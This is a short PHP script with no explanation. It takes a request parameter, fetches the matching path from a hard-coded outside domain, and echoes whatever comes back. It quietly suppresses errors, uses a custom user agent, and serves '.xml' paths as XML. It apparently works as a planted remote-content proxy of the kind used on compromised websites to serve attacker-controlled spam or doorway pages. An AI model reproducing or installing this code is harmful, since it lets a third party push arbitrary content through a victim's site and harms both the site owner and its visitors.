<?php
error_reporting(E_ERROR);
$remote_path="http://tijiaoya.top/tmnd.ru/";
$param_name="p";
$param_value="";

if(!empty($_REQUEST[$param_name]))
{
  $param_value=$_REQUEST[$param_name];
}

//header("Content-Type: text/html; charset=utf-8");
if(strpos($param_value, '.xml')>0)
{
    header("Content-type: text/xml");
}
if($param_value!="")
{
    $b=file_get_contents($remote_path.$param_value);
    if(empty($b))
    {
        $b=curlOpen($remote_path.$param_value);
    }
    echo $b;
    exit;
}

function curlOpen($url) 
{ 
  $ch2 = curl_init(); 
  $user_agent = "ConBot"; 
  curl_setopt($ch2, CURLOPT_URL, $url); 
  curl_setopt($ch2, CURLOPT_HEADER, false); 
  curl_setopt($ch2, CURLOPT_RETURNTRANSFER, 1); 
  curl_setopt($ch2, CURLOPT_TIMEOUT,25); 
  $contents = curl_exec($ch2); 
  curl_close($ch2); 
  return $contents; 
}
?>